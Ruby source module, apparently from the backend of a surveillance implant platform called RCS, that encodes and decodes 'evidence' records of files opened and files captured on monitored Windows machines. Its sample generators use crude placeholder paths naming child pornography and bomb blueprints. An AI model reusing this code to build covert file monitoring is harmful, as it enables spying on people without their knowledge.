require 'rcs-common/evidence/common'

require 'digest/md5'

module RCS

module FileopenEvidence

  ELEM_DELIMITER = 0xABADC0DE

  def content(*args)
    hash = [args].flatten.first || {}

    process = hash[:process] || ["Explorer.exe\0", "Firefox.exe\0", "Chrome.exe\0"].sample
    process.encode!("US-ASCII")

    path = hash[:path] || ["C:\\Utenti\\pippo\\pedoporno.mpg", "C:\\Utenti\\pluto\\Documenti\\childporn.avi", "C:\\secrets\\bomb_blueprints.pdf"].sample
    path = path.to_utf16le_binary_null

    content = StringIO.new
    t = Time.now.getutc
    content.write [t.sec, t.min, t.hour, t.mday, t.mon, t.year, t.wday, t.yday, t.isdst ? 0 : 1].pack('l*')
    content.write process
    content.write [ 0 ].pack('L') # size hi
    content.write [ hash[:size] || 123456789 ].pack('L') # size lo
    content.write [ 0x80000000 ].pack('l') # access mode
    content.write path
    content.write [ ELEM_DELIMITER ].pack('L')
    content.string
  end

  def generate_content(*args)
    [content(*args)]
  end

  def decode_content(common_info, chunks)
    stream = StringIO.new chunks.join

    until stream.eof?
      info = Hash[common_info]
      info[:data] = Hash.new
      info[:data][:type] = :open

      tm = stream.read 36
      info[:da] = Time.gm(*tm.unpack('l*'), 0)
      info[:data][:program] = ''
      info[:data][:path] = ''

      process_name = stream.read_ascii_string
      info[:data][:program] = process_name.force_encoding('US-ASCII') unless process_name.nil?

      size_hi = stream.read(4).unpack("L").first
      size_lo = stream.read(4).unpack("L").first
      info[:data][:size] = size_hi << 32 | size_lo
      info[:data][:access] = stream.read(4).unpack("l").first

      file = stream.read_utf16le_string
      info[:data][:path] = file.utf16le_to_utf8 unless file.nil?
      
      delim = stream.read(4).unpack("L*").first
      raise EvidenceDeserializeError.new("Malformed FILEOPEN (missing delimiter)") unless delim == ELEM_DELIMITER

      yield info if block_given?
    end
    :delete_raw
  end
end

module FilecapEvidence

  FILECAP_VERSION = 2008122901

  def content(*args)
    bytes = [args].flatten.first || nil

    if bytes
      bytes
    else
      path = File.join(File.dirname(__FILE__), 'content', ['file'].sample, @file)
      File.open(path, 'rb') {|f| f.read }
    end
  end

  def generate_content(*args)
    [ content(*args) ]
  end

  def additional_header(*args)
    hash = [args].flatten.first || {}

    path = hash[:path] || ["C:\\Documents\\Einstein.docx", "C:\\Documents\\arabic.docx"].sample
    @file = path[path.rindex(/\\|\//)+1..-1]

    path = path.to_utf16le_binary_null

    header = StringIO.new
    header.write [FILECAP_VERSION, path.size].pack("I*")
    header.write path

    header.string
  end

  def decode_additional_header(data)
    raise EvidenceDeserializeError.new("incomplete FILECAP") if data.nil? or data.bytesize == 0

    binary = StringIO.new data

    version, file_name_len = binary.read(8).unpack("I*")
    raise EvidenceDeserializeError.new("invalid log version for FILECAP") unless version == FILECAP_VERSION

    ret = Hash.new
    ret[:data] = Hash.new
    ret[:data][:path] = binary.read(file_name_len).utf16le_to_utf8
    return ret
  end

  def decode_content(common_info, chunks)
    info = Hash[common_info]
    info[:data] = Hash.new if info[:data].nil?
    info[:data][:type] = :capture
    info[:grid_content] = chunks.join
    info[:data][:size] = info[:grid_content].bytesize
    info[:data][:md5] = Digest::MD5.hexdigest info[:grid_content]
    yield info if block_given?
    :delete_raw
  end
end

end # ::RCS